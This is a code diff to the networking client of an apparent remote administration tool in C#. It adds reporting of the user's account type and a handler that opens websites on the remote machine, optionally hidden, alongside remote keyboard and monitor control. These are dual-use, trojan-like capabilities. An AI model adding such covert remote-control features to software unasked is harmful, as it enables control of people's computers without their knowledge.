@@ -51,11 +51,12 @@ namespace RemoteAdmin.Client.Networking
                             networkStream, clientCert, caCert, "RemoteAdmin Server");
 
                         Console.WriteLine("✓ Secure TLS connection established!");
-
-                        // Get local IP
+                        
                         var ep = (System.Net.IPEndPoint?)tcpClient.Client.LocalEndPoint;
                         var ip = ep?.Address;
                         if (ip.IsIPv4MappedToIPv6) ip = ip.MapToIPv4();
+
+                        var userAccount = new UserAccount();
 
                         var clientInfo = new ClientInfoMessage
                         {
@@ -63,7 +64,8 @@ namespace RemoteAdmin.Client.Networking
                             Username = Environment.UserName,
                             OSVersion = Environment.OSVersion.ToString(),
                             IPAddress = ip.ToString(),
-                            PublicIP = await GetPublicIPAsync()
+                            PublicIP = await GetPublicIPAsync(),
+                            AccountType = userAccount.Type.ToString()
                         };
 
                         await NetworkHelper.SendMessageAsync(sslStream, clientInfo);
@@ -91,28 +93,6 @@ namespace RemoteAdmin.Client.Networking
             }
         }
 
-        private static X509Certificate2 LoadEmbeddedCertificate(string resourceName, string password)
-        {
-            var assembly = Assembly.GetExecutingAssembly();
-            using var stream = assembly.GetManifestResourceStream(resourceName);
-
-            if (stream == null)
-                throw new Exception($"Certificate not found: {resourceName}");
-
-            byte[] certData = new byte[stream.Length];
-            stream.Read(certData, 0, certData.Length);
-
-            if (password == null)
-            {
-                // For .crt files (public cert only, no password)
-                return new X509Certificate2(certData);
-            }
-            else
-            {
-                // For .pfx files (with private key)
-                return new X509Certificate2(certData, password, X509KeyStorageFlags.Exportable);
-            }
-        }
         static async Task<string> GetPublicIPAsync()
         {
             try
@@ -264,6 +244,16 @@ namespace RemoteAdmin.Client.Networking
                     else if (message is KeyboardInputMessage keyboardInput)
                     {
                         _ = Task.Run(() => RemoteDesktopHandler.HandleKeyboardInput(keyboardInput));
+                    }
+                    else if (message is VisitWebsiteMessage visitMsg)
+                    {
+                        Console.WriteLine($"Received visit website request: {visitMsg.Url} (Hidden: {visitMsg.Hidden})");
+                        _ = Task.Run(async () => await WebsiteVisitorHandler.HandleVisitWebsite(stream, visitMsg));
+                    }
+                    else if (message is SelectMonitorMessage selectMonitor)
+                    {
+                        Console.WriteLine($"Received select monitor request: Monitor {selectMonitor.MonitorIndex}");
+                        RemoteDesktopHandler.HandleSelectMonitor(selectMonitor);
                     }
                 }
             }
